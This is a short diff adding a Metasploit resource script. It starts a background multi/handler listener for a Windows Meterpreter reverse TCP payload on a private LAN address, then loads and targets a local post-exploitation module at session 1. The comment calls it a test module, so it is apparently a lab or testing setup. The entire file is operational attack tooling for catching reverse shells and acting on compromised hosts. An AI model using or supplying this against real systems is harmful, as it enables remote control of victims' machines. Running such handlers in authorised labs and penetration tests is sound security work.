@@ -1,0 +1,11 @@
+#rc script to start a rev meterp handler and set autorun my test module
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lport 8888
+set lhost 192.168.1.14
+set exitonsession false
+exploit -j -z
+loadpath test/modules
+use post/test/services
+set SESSION 1
